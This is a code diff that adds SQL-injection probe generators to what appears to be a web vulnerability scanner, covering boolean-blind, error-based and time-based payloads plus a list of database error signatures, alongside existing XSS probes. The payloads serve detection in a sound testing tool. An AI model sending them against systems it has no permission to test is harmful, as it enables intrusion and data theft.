@@ -41,6 +41,90 @@ def stored_marker_signal(token: str) -> str:
     return f"{STORED_MARKER_PREFIX}{token}<svg/onload=1>"
 
 
+def sqli_boolean_pairs(value: str) -> list[tuple[str, str, str]]:
+    """
+    Boolean (blind) SQL-injection probe pairs across common query contexts.
+
+    Each tuple is (context_label, true_payload, false_payload): two injections that
+    are logically TRUE vs FALSE but otherwise identical. In a vulnerable query the
+    database evaluates the condition, so the TRUE request behaves like the original
+    (same rows) while the FALSE request suppresses them — a response difference the
+    detector can see. In a safe (parameterised) query both are treated as literal
+    text, so the two responses are identical and nothing is raised.
+
+    The original benign value is kept as a prefix so we stay inside whatever
+    clause the parameter normally lands in before adding the condition.
+    """
+    v = value if value not in (None, "") else "1"
+    return [
+        # value is used numerically: ... WHERE id = 1 AND 1=1
+        ("numeric", f"{v} AND 1=1", f"{v} AND 1=2"),
+        # value is inside a single-quoted string: ... WHERE name = '1' AND '1'='1'
+        ("single-quote", f"{v}' AND '1'='1", f"{v}' AND '1'='2"),
+        # single-quoted string, terminated with a comment: ... = '1' AND 1=1-- -
+        ("single-quote-comment", f"{v}' AND 1=1-- -", f"{v}' AND 1=2-- -"),
+        # value inside a parenthesised single-quoted clause: ... IN ('1') ...
+        ("paren-single-quote", f"{v}') AND ('1'='1", f"{v}') AND ('1'='2"),
+        # double-quoted string context
+        ('double-quote', f'{v}" AND "1"="1', f'{v}" AND "1"="2'),
+    ]
+
+
+def sqli_error_payloads(value: str) -> list[tuple[str, str]]:
+    """
+    Syntax-breaking probes for error-based SQLi: a lone quote/paren/backslash that,
+    if concatenated into a query, makes the SQL unparsable. A *database* error
+    surfacing in the response means the input reached the SQL engine verbatim.
+
+    Each tuple is (label, breaking_payload).
+    """
+    v = value if value not in (None, "") else "1"
+    return [
+        ("single-quote", f"{v}'"),
+        ("double-quote", f'{v}"'),
+        ("paren-quote", f"{v}')"),
+        ("backslash", f"{v}\\"),
+    ]
+
+
+# Lower-cased fragments of real DBMS error messages. A match that is NOT already in
+# the untouched response is strong evidence the input broke a SQL statement.
+SQL_ERROR_SIGNATURES = [
+    # SQLite
+    "sqlite3.", "unrecognized token", "sqlite error", "no such column",
+    "incomplete input", "unterminated",
+    # MySQL / MariaDB
+    "you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
+    "mysqli", "check the manual that corresponds to your",
+    # PostgreSQL
+    "syntax error at or near", "unterminated quoted string", "pg::", "pg_query",
+    # MS SQL Server
+    "unclosed quotation mark", "microsoft odbc", "microsoft ole db",
+    "microsoft sql server", "incorrect syntax near",
+    # Oracle
+    "ora-0", "quoted string not properly terminated",
+    # generic
+    "sqlexception", "sqlstate", "odbc driver", "syntax error",
+]
+
+
+def sqli_time_payloads(value: str, delay: int) -> list[tuple[str, str]]:
+    """
+    Blind time-based probes across dialects: a conditional sleep of `delay` seconds.
+    A response that is slow by ~delay only when the sleep is injected means the DB
+    executed it. Each tuple is (label, payload).
+    """
+    v = value if value not in (None, "") else "1"
+    d = int(delay)
+    return [
+        ("mysql-numeric", f"{v} AND SLEEP({d})"),
+        ("mysql-quote", f"{v}' AND SLEEP({d})-- -"),
+        ("postgres", f"{v} AND (SELECT 1 FROM pg_sleep({d}))"),
+        ("postgres-quote", f"{v}' AND (SELECT 1 FROM pg_sleep({d}))-- -"),
+        ("mssql", f"{v}; WAITFOR DELAY '0:0:{d}'-- -"),
+    ]
+
+
 def xss_exec_payloads(token: str) -> list[str]:
     """Execution probes for the browser verifier, across common contexts."""
     cb = f"window.{EXEC_BINDING}"
